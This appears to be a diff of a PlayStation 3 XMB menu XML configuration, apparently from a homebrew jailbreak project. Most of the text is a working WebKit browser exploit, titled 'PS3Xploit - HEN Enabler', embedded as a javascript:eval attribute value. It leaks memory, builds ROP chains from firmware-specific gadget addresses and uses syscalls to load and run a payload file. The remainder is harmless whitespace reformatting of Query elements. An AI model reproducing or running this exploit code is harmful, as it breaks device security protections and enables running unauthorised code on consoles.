d2b(g_mod2_addr)+f16(0x60,dbyte41)+d2b(gtemp_addr)+f16(0x10,dbyte41)+d2b(g_mod1_addr)+f16(0x50,dbyte41)+f4(0xC,dbyte41)+w2b(j)+w2b(i)+w2b(g)+w2b(f)+w2b(e)+w2b(d)+w2b(c)+f4(0x4,dbyte41)+w2b(h)+f16(0x20,dbyte41)+d2b(b)+f16(0x10,dbyte41)+d2b(g_mod2_addr)+f16(0x60,dbyte41)+d2b(l)+f16(0x10,dbyte41)+d2b(a)+f16(k-n,dbyte00)+d2b(m)+d2b(sp_exit)+f8(0x8,dbyte41)}function f4(a,b){var c=\47\47;var d=0;var e=h2b(b);while(d\74a/4){c+=e.repeat(2);d++}return c}function f8(a,b){var c=\47\47;var d=0;var e=h2b(b);while(d\74a/8){c+=e.repeat(4);d++}return c}function f16(a,b){var c=\47\47;var d=0;var e=h2b(b);while(d\74a/16){c+=e.repeat(8);d++}return c}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;var b=0,index_key_addr=0;var c=70*0x100000;var d=0x80100000;var f=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++;xtra_data=start_x.convert()+usb_sp.convert()+index_key.convert(true)+unescape("\uFD7E");while(xtra_data_addr===0){if(c\74f){load_check();return}xtra_data=xtra_data.replaceAt(0,h2b(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,d,f);c-=f}b=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=b+usb_sp.convertedSize();stack_frame=stack_frame_hookup()+syscall(0x321,b,0x0,0x8e000000,0,0,0,0,0)+syscall_r3r5_p2p(0x322,0x8e000000,0x8a000000,0x110000,0x8e000008,0,0,0,0,0,0)+syscall_r3_p2p(0x324,0x8e000000,0,0,0,0,0,0,0,0,0)+stack_frame_swap(0x8a000000)+stack_frame_exit();while(stack_frame_addr===0){if(c\74f+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,h2b(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,d+search_base_off,f+search_size_ext);if(stack_frame_addr==-1)if(c\74f+search_size_ext){frame_fails++;load_check();return}c-=f+search_size_ext}jump_2=unescape("\u0102\u7EFB")+f16(0x30,0x8282)+w2b(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(c\74f){load_check();return}jump_2=jump_2.replaceAt(0,h2b(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,d,f);if(jump_2_addr==-1)if(c\74f){load_check();return}c-=f}jump_1=unescape("\u4141\u7EFA")+w2b(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(c\74f){load_check();return}jump_1=jump_1.replaceAt(0,h2b(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,d,f);if(jump_1_addr==-1)if(c\74f){load_check();return}c-=f}var g=chkMem(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=chkMem(xtra_data_addr-0x4,0x1000,xtra_data.length);var h=chkMem(jump_2_addr-0x4,0x1000,jump_2.length);var i=chkMem(jump_1_addr-0x4,0x1000,jump_1.length);if((h===jump_2)&&(i===jump_1)&&(x===xtra_data)&&(g===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
+				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,mbytes=1048576,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,stat_size_offset=40,toc_addr=7296336,gadget1_addr=620036,gadget8_addr=131072,gmod1_addr=6352696,gmod2_addr=80756,gmod3_addr=757248,gmod4a_addr=890500,gmod7_addr=108204,gmod8_addr=2862264,gmod4b_addr=0x42c778,gmod4c_addr=0x054af0,gmod15_addr=0x39d038,gmod12_addr=0x63315c,gmod9_addr=0x010b20,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),progress_msg_frag1="\74h1\76Enabling \74s\76HEN\74/s\76 ",progress_msg_frag2="%\74/h1\76",fail_msg_frag=\47\74div id="c" class="fail"\76\74/div\76\74div id="d"\76\74s\76HEN\74/s\76 \74b\76Exploit initialization failed!\74/b\76\74/div\76\47,fsopen=0x321,fsread=0x322,fswrite=0x323,fsclose=0x324,fsstat=0x328;if(fwv==="4.86"){(toc_addr=7296344),(gadget1_addr=620036),(gadget8_addr=131072),(gmod1_addr=6352856),(gmod2_addr=80756),(gmod3_addr=757248),(gmod4a_addr=890500),(gmod4b_addr=4376440),(gmod4c_addr=346864),(gmod7_addr=108204),(gmod8_addr=2862264),(gmod9_addr=68384),(gmod12_addr=6500860),(gmod15_addr=3788856)}function show(str){document.getElementById("result").innerHTML=str}function scall_r3r5_p2p(sc,r3_ptr,r4,r5_ptr,r6,r7,r8,r9,r10,r31out){if(r31out===null){r31out=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(sc)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+fill4(0x4,dbyte41)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x10,dbyte41)+hdw(r5_ptr-0x4)+hdw(gtemp_addr)+fill8(0x18,dbyte41)+hdw(gmod4c_addr)+fill16(0xb0,dbyte41)+hdw(r3_ptr)+fill16(0x10,dbyte41)+hdw(gmod4b_addr)+fill16(0x60,dbyte41)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function load_r3_word_from_ptr_32(offset,r26out,r27out,r28out,r29out,r30out,r31out){return(hdw(gmod3_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+hdw(offset-0x8)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod15_addr)+fill16(0x50,dbyte41)+fill8(0x8,dbyte41)+hdw(r26out)+hdw(r27out)+hdw(r28out)+hdw(r29out)+hdw(r30out)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function h2b(hex_val){return String.fromCharCode(hex_val)}function hw(hex_val){return(String.fromCharCode(hex_val\76\7616)+String.fromCharCode(hex_val))}function hdw(hex_val){return hw(0)+hw(hex_val)}String.prototype.toHex16=function(){return("0000"+this).substr(-4)};String.prototype.toAscii=function(hex_16){var ascii="";var i=0;while(i\74this.length){if(hex_16===true){ascii+=this.charCodeAt(i).toString(16).toHex16()}else{ascii+=this.charCodeAt(i).toString(16)}i+=1}return ascii};String.prototype.convert=function(ascii){if(this.length\741){return""}var asciistr="";var asciichr="";var i=0;var ret=[];if(ascii===true){asciistr=this}else{asciistr=this.toAscii()}while(asciistr.length%4!==0){asciistr+="00"}if(asciistr.substr(asciistr.length-3,2)!=="00"){asciistr+="0000"}while(i\74asciistr.length){asciichr=asciistr.substr(i,4);ret.push(String.fromCharCode(parseInt(asciichr,16)));i+=4}return ret.join("")};String.prototype.convertedSize=function(ascii){if(this.length\741){return 0}var asciistr="";if(ascii===true){asciistr=this}else{asciistr=this.toAscii()}while(asciistr.length%4!==0){asciistr+="00"}if(asciistr.substr(asciistr.length-3,2)!=="00"){asciistr+="0000"}return asciistr.length/2};String.prototype.replaceAt=function(index,ch){return this.substr(0,index)+ch+this.substr(index+ch.length)};String.prototype.repeat=function(num){return new Array(num+1).join(this)};Number.prototype.noExponents=function(){var data=String(this).split(/[eE]/);if(data.length===1){return data[0]}var z="",sign=this\740?"-":"",str=data[0].replace(".",""),mag=Number(data[1])+1;if(mag\740){z=sign+"0.";while(mag++){z+="0"}return z+str.replace(/^\-/,"")}mag-=str.length;while(mag--){z+="0"}return str+z};function fromIEEE754(bytes,ebits,fbits){var retNumber=0;var bits=[];var i;var j;var byte;for(i=bytes.length;i;i-=1){byte=bytes[i-1];for(j=8;j;j-=1){bits.push(byte%2?1:0);byte=byte\76\761}}bits.reverse();var str=bits.join("");var bias=(1\74\74(ebits-1))-1;var s=parseInt(str.substring(0,1),2)?-1:1;var e=parseInt(str.substring(1,1+ebits),2);var f=parseInt(str.substring(1+ebits),2);if(e===(1\74\74ebits)-1){retNumber=f!==0?NaN:s*Infinity}else if(e\760){retNumber=s*Math.pow(2,e-bias)*(1+f/Math.pow(2,fbits))}else if(f!==0){retNumber=s*Math.pow(2,-(bias-1))*(f/Math.pow(2,fbits))}else{retNumber=s*0}return retNumber.noExponents()}function generateIEEE754(address,size){var hex=new Array((address\76\7624)\460xff,(address\76\7616)\460xff,(address\76\768)\460xff,address\460xff,(size\76\7624)\460xff,(size\76\7616)\460xff,(size\76\768)\460xff,size\460xff);return fromIEEE754(hex,11,52)}function generateExploit(address,size){var n=(address\74\7432)|((size\76\761)-1);return generateIEEE754(address,n-address)}function rmem(address,size){if(document.getElementById("exploit")){document.getElementById("exploit").style.src="local("+generateExploit(address,size)+")"}}function cmem(address,size,len){if(document.getElementById("exploit")){rmem(address,size);return document.getElementById("exploit").style.src.substr(6,len)}}function trigger(exploit_addr){if(document.getElementById("trigger")){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+exploit_addr.toString(16)+")")}}function lc1(){if(total_loops\74max_loops){t_out=setTimeout(initROP,500,false)}else{total_loops=0;show(fail_msg_frag);t_out=0}}function lc2(){if(total_loops\74max_loops){t_out=setTimeout(initROP2,500,false)}else{total_loops=0;show(fail_msg_frag);2;t_out=0}}function findJsVariableOffset(name,exploit_data,base,size){rmem(base,size);var dat=document.getElementById("exploit").style.src.substr(6,size),i=0,t,k,match,exploit_addr;while(i\74dat.length*2){if(dat.charCodeAt(i/2)===exploit_data.charCodeAt(0)){match=0;for(k=0;k\74exploit_data.length*2;k+=0x2){if(dat.charCodeAt((i+k)/2)!==exploit_data.charCodeAt(k/2)){break}match+=1}if(match===exploit_data.length){exploit_addr=base+i+4;for(t=0;t\74offset_array.length;t+=1){if(offset_array[t]===exploit_addr){return-1}}offset_array.push(exploit_addr);return exploit_addr}}i+=0x10}return 0}function memcpy(dest,src,len){return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70)}function stack_frame_hookup(){return(unescape("\u4141\u2A2F")+hw(gadget1_addr)+hw(toc_addr)+fill16(0x20,dbyte41)+hdw(toc_addr)+fill16(0x70,dbyte41))}function scall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out){if(r31out===null){r31out=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(sc)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+hw(r5)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x20,dbyte41)+hdw(r3)+fill16(0x10,dbyte41)+hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod4a_addr)+fill16(0x60,dbyte41)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out){var min_stack_size=0x20;if(r31out===null){r31out=gtemp_addr}if(r31in===null){r31in=gtemp_addr}return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+fill16(0x10,dbyte41)+hdw(gmod1_addr)+fill16(0x50,dbyte41)+fill4(0xc,dbyte41)+hw(r11)+hw(r10)+hw(r8)+hw(r7)+hw(r6)+hw(r5)+hw(r4)+fill4(0x4,dbyte41)+hw(r9)+fill16(0x20,dbyte41)+hdw(r3)+fill16(0x10,dbyte41)+hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(r31in)+fill16(0x10,dbyte41)+hdw(sub)+fill16(sub_frame_size-min_stack_size,dbyte00)+hdw(r31out)+hdw(sp_exit)+fill8(0x8,dbyte41))}function fillNbytes(nbytes,hex_val,N){var stemp="",iterator=0,tmp=h2b(hex_val);while(iterator\74nbytes/N){stemp+=tmp.repeat(N/2);iterator++}return stemp}function fill4(nbytes,hex_val){return fillNbytes(nbytes,hex_val,4)}function fill8(nbytes,hex_val){return fillNbytes(nbytes,hex_val,8)}function fill16(nbytes,hex_val){return fillNbytes(nbytes,hex_val,16)}function strncmp(str1,str2,n){str1=str1.substring(0,n);str2=str2.substring(0,n);return str1==str2?0:str1\76str2?1:-1}function rop_exit_hen(fail){var chk="53434500";var chk2=cmem(0x8a000000,0x10,3);chk2=chk2.toAscii(true);if(strncmp(chk,chk2,4)!=0){show(\47\74div id="c" class="fail"\76\74/div\76\74b\76Failed! Rebooting!\74/b\76\47);initROP2(true)}else{window.close()}}function initROP2(init){try{if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;total_loops=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;stack_frame=stack_frame_hookup()+stack_frame_swap(0x8a060000);while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if(frame_fails%10===0){search_base_off+=0;search_size_ext+=0}lc2();return}stack_frame=stack_frame.replaceAt(0,h2b(0x2a2f));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;lc2();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill16(0x30,0x8282)+hw(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){lc2();return}jump_2=jump_2.replaceAt(0,h2b(0x7efb));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hw(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){lc2();return}jump_1=jump_1.replaceAt(0,h2b(0x7efa));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){lc2();return}search_max_threshold-=search_size}var sf=cmem(stack_frame_addr-0x4,0x8000,stack_frame.length);var j2=cmem(jump_2_addr-0x4,0x1000,jump_2.length);var j1=cmem(jump_1_addr-0x4,0x1000,jump_1.length);if(j2===jump_2\46\46j1===jump_1\46\46sf===stack_frame){if(t_out!==0){clearTimeout(t_out)}setTimeout(trigger,1000,jump_1_addr)}else{lc2()}}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function initROP(init){try{if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_base_off=0*mbytes;search_size_ext=0*mbytes;total_loops++;var usb_sp="/dev_flash/hen/PS3HEN.BIN";xtra_data=start_x.convert()+usb_sp.convert()+index_key.convert(true)+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\74search_size){lc1();return}xtra_data=xtra_data.replaceAt(0,h2b(0x7efd));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}var usb_fp_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=usb_fp_addr+usb_sp.convertedSize();stack_frame=stack_frame_hookup()+scall(0x321,usb_fp_addr,0,0x8e000000,0,0,0,0,0)+scall_r3r5_p2p(0x322,0x8e000000,0x8a000000,0x300000,0x8e000008,0,0,0,0,0,0)+stack_frame_swap(0x8a000000);while(stack_frame_addr===0){if(search_max_threshold\74search_size+search_size_ext){frame_fails++;if(frame_fails%10===0){search_base_off+=0;search_size_ext+=0}lc1();return}stack_frame=stack_frame.replaceAt(0,h2b(0x2a2f));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\74search_size+search_size_ext){frame_fails++;lc1();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill16(0x30,0x8282)+hw(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\74search_size){lc1();return}jump_2=jump_2.replaceAt(0,h2b(0x7efb));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hw(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){lc1();return}jump_1=jump_1.replaceAt(0,h2b(0x7efa));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){lc1();return}search_max_threshold-=search_size}var sf=cmem(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=cmem(xtra_data_addr-0x4,0x1000,xtra_data.length);var j2=cmem(jump_2_addr-0x4,0x1000,jump_2.length);var j1=cmem(jump_1_addr-0x4,0x1000,jump_1.length);if(j2===jump_2\46\46j1===jump_1\46\46x===xtra_data\46\46sf===stack_frame){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{lc1()}}catch(e){show("HEN installation failed because the following exception was thrown during execution: "+e+" at: "+e.lineNumber)}}function stack_frame_swap(new_stack_addr){return(hdw(gmod2_addr)+fill16(0x60,dbyte41)+hdw(gtemp_addr)+hdw(new_stack_addr)+fill8(0x8,dbyte41)+hdw(gmod9_addr))}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit_hen,4500,"\74b\76HEN Failed!\74/b\76");t_out=0;total_loops=0}document.write(\47\74html\76\74head\76\74title\76PS3Xploit - HEN Enabler\74/title\76\74style\76html{color:#fff;left:100%;overflow:hidden;position:relative}*{font-weight:100;font-size:32px !important}#a{display:table;height:100%;left:-100%;position:relative;width:100%;text-align:center}#b{display:table-cell;text-align:center;vertical-align:middle;width:100%}#c{-webkit-animation:s 2s infinite;-webkit-border-radius:10px;background:#6f0;display:inline-block;height:48px;right:24px;position:absolute;top:28px;width:48px}#c.fail{background:#f00}#d{position:relative;z-index:1}#result{-webkit-border-radius:10px;background:#000;display:inline-block;font-weight:700;padding:32px;padding-right:92px;position:relative}@-webkit-keyframes s{0%{-webkit-transform:rotate(0)}100%,90%{-webkit-transform:rotate(540deg)}}input{opacity:0}b{color:#f00}s{color:#6f0;text-decoration:none;font-weight:800}\74/style\76\74/head\76\74body\76\74div id="exploit"\76\74/div\76\74div id="trigger"\76\74/div\76\74div id="a"\76 \74input type="radio" autofocus/\76\74div id="b"\76\74div id="result"\76\74div id="c"\76\74/div\76\74div id="d"\76Enabling \74s\76HEN\74/s\76\74/div\76\74/div\76\74/div\76\74/div\76\74/body\76\74/html\76\47);setTimeout(function(){initROP(true)},0);');</String></Pair>
 			</Table>
 		</Attributes>
 		<Items>
@@ -689,7 +438,6 @@
 		</Items>
 	</View>
 -->
-
 	<View id="seg_gamedebug">
 		<Attributes>
 			<Table key="game_debug">
@@ -699,7 +447,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query class="type:x-xcb/game-debug" key="game_debug"  attr="game_debug" />
+			<Query class="type:x-xcb/game-debug" key="game_debug" attr="game_debug"/>
 		</Items>
 	</View>
 
@@ -715,11 +463,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="package_files" attr="package_files"
-				src="#seg_package_fixed"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="package_files" attr="package_files" src="#seg_package_fixed"/>
 		</Items>
 	</View>
 
@@ -745,28 +489,15 @@
 				<Pair key="ingame"><String>disable</String></Pair>
 			</Table>
 		</Attributes>
-
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="host_psn" attr="host_psn"
-				src="#seg_install_files_psn_path"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_psn" attr="host_psn" src="#seg_install_files_psn_path"/>
 		</Items>
 	</View>
 
 	<View id="seg_install_files_psn_path">
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_hdd_install"
-				src="ese://localhost/query?type=install_game"
-				/>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="seg_pkg_install"
-				src="ese://localhost/query?type=install_pkg"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_hdd_install" src="ese://localhost/query?type=install_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="seg_pkg_install" src="ese://localhost/query?type=install_pkg"/>
 		</Items>
 	</View>
 
@@ -782,11 +513,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="package_files_install" attr="package_files_install"
-				src="#seg_install_package"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="package_files_install" attr="package_files_install" src="#seg_install_package"/>
 		</Items>
 	</View>
 
@@ -814,11 +541,7 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="host_device" attr="host_device"
-				src="#seg_install_files_alldev_path"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_install_files_alldev_path"/>
 		</Items>
 	</View>
 	<View id="seg_install_files_alldev_path">
@@ -880,13 +603,8 @@
 				<Pair key="ingame"><String>disable</String></Pair>
 			</Table>
 		</Attributes>
-
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="host_device" attr="host_device"
-				src="#seg_install_files_hdd0_path"
-				/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_install_files_hdd0_path"/>
 		</Items>
 	</View>
 
@@ -910,27 +628,23 @@
 			</Table>
 		</Attributes>
 		<Items>
-			<Query
-				class="type:x-xmb/folder-pixmap"
-				key="host_device" attr="host_device"
-				src="#seg_install_usb_path"
-			/>
+			<Query class="type:x-xmb/folder-pixmap" key="host_device" attr="host_device" src="#seg_install_usb_path"/>
 		</Items>
 	</View>
 
 	<View id="seg_install_usb_path">
 		<Items>
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/packages/&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms" 	src="host://localhost/q?path=/dev_ms/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2" src="host://localhost/q?path=/dev_usb002/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3" src="host://localhost/q?path=/dev_usb003/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4" src="host://localhost/q?path=/dev_usb004/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5" src="host://localhost/q?path=/dev_usb005/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6" src="host://localhost/q?path=/dev_usb006/packages&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7" src="host://localhost/q?path=/dev_usb007/packages&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/packages/&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms"	src="host://localhost/q?path=/dev_ms/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2" src="host://localhost/q?path=/dev_usb002/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3" src="host://localhost/q?path=/dev_usb003/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4" src="host://localhost/q?path=/dev_usb004/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5" src="host://localhost/q?path=/dev_usb005/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6" src="host://localhost/q?path=/dev_usb006/packages&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7" src="host://localhost/q?path=/dev_usb007/packages&suffix=.pkg&subclass=x-host/package"/>
 		</Items>
 	</View>
 
@@ -946,29 +660,24 @@
 				<Pair key="ingame"><String>disable</String></Pair>
 			</Table>
 		</Attributes>
-
 		<Items>
-			<Query
-				class="type:x-xmb/xmlpackagefolder"
-				key="host_device" attr="host_device"
-				src="#seg_install_files_og_path"
-				/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_device" attr="host_device" src="#seg_install_files_og_path"/>
 		</Items>
 	</View>
 
 	<View id="seg_install_files_og_path">
 		<Items>
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms" 	src="host://localhost/q?path=/dev_ms&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb2" src="host://localhost/q?path=/dev_usb002&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb3" src="host://localhost/q?path=/dev_usb003&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb4" src="host://localhost/q?path=/dev_usb004&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb5" src="host://localhost/q?path=/dev_usb005&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb6" src="host://localhost/q?path=/dev_usb006&suffix=.pkg&subclass=x-host/package" />
-			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb7" src="host://localhost/q?path=/dev_usb007&suffix=.pkg&subclass=x-host/package" />
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_host" src="host://localhost/q?path=/app_home/&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_bdvd" src="host://localhost/q?path=/dev_bdvd&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_ms"	src="host://localhost/q?path=/dev_ms&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb0" src="host://localhost/q?path=/dev_usb000&suffix=.pkg&subclass=x-host/package"/>
+			<Query class="type:x-xmb/xmlpackagefolder" key="host_provider_usb1" src="host://localhost/q?path=/dev_usb001&suffix=.pkg&subclass=x-host/package"/>
